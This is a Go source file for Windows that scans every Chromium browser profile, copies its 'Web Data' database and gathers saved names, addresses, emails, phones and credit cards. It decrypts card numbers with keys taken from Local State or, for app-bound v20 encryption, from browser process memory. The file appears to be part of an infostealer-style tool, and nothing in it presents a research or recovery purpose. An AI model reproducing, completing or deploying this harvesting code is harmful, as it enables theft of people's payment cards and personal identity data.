//go:build windows

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// readWebData opens a browser's Web Data SQLite file and reads autofill tables.
func readWebData(b chromiumBrowser, profile string, aesKey *[]byte) ([]AutofillProfile, []CreditCard, error) {
	dbPath := filepath.Join(b.userDataDir, profile, "Web Data")
	if _, err := os.Stat(dbPath); err != nil {
		return nil, nil, nil
	}
	tmp, err := tempCopy(dbPath)
	if err != nil {
		return nil, nil, fmt.Errorf("copy failed: %w", err)
	}
	defer os.Remove(tmp)

	db, err := newSQLiteReader(tmp)
	if err != nil {
		return nil, nil, fmt.Errorf("open sqlite: %w", err)
	}

	source := b.name
	if profile != "Default" {
		source = fmt.Sprintf("%s (%s)", b.name, profile)
	}

	profiles := readAutofillProfiles(db, source)
	cards := readCreditCards(db, b.name, b.userDataDir, source, aesKey)
	return profiles, cards, nil
}

// readAutofillProfiles reads address/identity profiles from Web Data.
// Joins autofill_profiles + autofill_profile_names + autofill_profile_emails + autofill_profile_phones.
func readAutofillProfiles(db *sqliteReader, source string) []AutofillProfile {
	// guid → AutofillProfile map
	byGUID := make(map[string]*AutofillProfile)

	// ── autofill_profiles: guid(0) company(1) street_address(2) dependent_locality(3)
	//    city(4) state(5) zipcode(6) sorting_code(7) country_code(8) ...
	if rows, err := db.ReadTable("autofill_profiles"); err == nil {
		for _, row := range rows {
			if len(row) < 9 {
				continue
			}
			guid, _ := row[0].(string)
			if guid == "" {
				continue
			}
			p := &AutofillProfile{Source: source}
			p.Address, _ = row[2].(string)
			p.City, _ = row[4].(string)
			p.State, _ = row[5].(string)
			p.Zip, _ = row[6].(string)
			p.Country, _ = row[8].(string)
			byGUID[guid] = p
		}
	}

	// ── autofill_profile_names: guid(0) honorific(1) first(2) middle(3) last(4) full(5)
	if rows, err := db.ReadTable("autofill_profile_names"); err == nil {
		for _, row := range rows {
			if len(row) < 2 {
				continue
			}
			guid, _ := row[0].(string)
			p, ok := byGUID[guid]
			if !ok {
				p = &AutofillProfile{Source: source}
				byGUID[guid] = p
			}
			// Try full_name (col 5), fall back to first+last (cols 2+4)
			if len(row) >= 6 {
				if full, _ := row[5].(string); full != "" {
					p.FullName = full
					continue
				}
			}
			first, _ := row[2].(string)
			last := ""
			if len(row) >= 5 {
				last, _ = row[4].(string)
			}
			if first != "" || last != "" {
				p.FullName = strings.TrimSpace(first + " " + last)
			}
		}
	}

	// ── autofill_profile_emails: guid(0) email(1)
	if rows, err := db.ReadTable("autofill_profile_emails"); err == nil {
		for _, row := range rows {
			if len(row) < 2 {
				continue
			}
			guid, _ := row[0].(string)
			email, _ := row[1].(string)
			if p, ok := byGUID[guid]; ok && email != "" {
				p.Email = email
			}
		}
	}

	// ── autofill_profile_phones: guid(0) number(1)
	if rows, err := db.ReadTable("autofill_profile_phones"); err == nil {
		for _, row := range rows {
			if len(row) < 2 {
				continue
			}
			guid, _ := row[0].(string)
			phone, _ := row[1].(string)
			if p, ok := byGUID[guid]; ok && phone != "" {
				p.Phone = phone
			}
		}
	}

	var out []AutofillProfile
	for _, p := range byGUID {
		// Skip completely empty profiles
		if p.FullName == "" && p.Email == "" && p.Phone == "" && p.Address == "" {
			continue
		}
		out = append(out, *p)
	}
	return out
}

// readCreditCards reads saved credit cards from Web Data.
// credit_cards: guid(0) name_on_card(1) expiration_month(2) expiration_year(3)
//               card_number_encrypted(4) ...
func readCreditCards(db *sqliteReader, browserName, userDataDir, source string, aesKey *[]byte) []CreditCard {
	rows, err := db.ReadTable("credit_cards")
	if err != nil {
		return nil
	}

	// Fetch key lazily — same v10/v20 strategy as passwords.
	if *aesKey == nil {
		for _, row := range rows {
			if len(row) < 5 {
				continue
			}
			blob, _ := row[4].([]byte)
			if len(blob) < 3 {
				continue
			}
			prefix := string(blob[:3])
			if prefix == "v10" {
				if k, err := getKeyFromLocalState(userDataDir); err == nil && tryDecryptKey(k, blob) {
					*aesKey = k
					break
				}
				if k, err := getKeyFromBrowserMemory(browserName, blob); err == nil {
					*aesKey = k
				}
				break
			} else if prefix == "v20" {
				if k, err := getKeyFromBrowserMemory(browserName, blob); err == nil {
					*aesKey = k
				}
				break
			}
		}
	}

	var cards []CreditCard
	for _, row := range rows {
		if len(row) < 5 {
			continue
		}
		nameOnCard, _ := row[1].(string)
		expMonth := fmt.Sprintf("%v", row[2])
		expYear := fmt.Sprintf("%v", row[3])
		cardBlob, _ := row[4].([]byte)

		number := ""
		if len(cardBlob) > 0 {
			plain, err := decryptPassword(*aesKey, cardBlob)
			if err != nil {
				number = "[decrypt failed]"
			} else {
				number = plain
			}
		}
		if number == "" && nameOnCard == "" {
			continue
		}
		cards = append(cards, CreditCard{
			NameOnCard: nameOnCard,
			Number:     number,
			ExpMonth:   expMonth,
			ExpYear:    expYear,
			Source:     source,
		})
	}
	return cards
}

// scanAllAutofill iterates all Chromium browsers/profiles and collects autofill data.
func scanAllAutofill(env envPaths) ([]AutofillProfile, []CreditCard, []string) {
	var (
		allProfiles []AutofillProfile
		allCards    []CreditCard
		errors      []string
	)

	for _, b := range resolvedChromiumBrowsers(env) {
		if _, err := os.Stat(b.userDataDir); err != nil {
			continue
		}
		// cachedKey shared across profiles — key fetched lazily on first encrypted blob.
		var cachedKey []byte
		for _, profile := range profilesInUserData(b.userDataDir) {
			profiles, cards, err := readWebData(b, profile, &cachedKey)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s/%s autofill: %v", b.name, profile, err))
				continue
			}
			allProfiles = append(allProfiles, profiles...)
			allCards = append(allCards, cards...)
		}
	}

	return allProfiles, allCards, errors
}
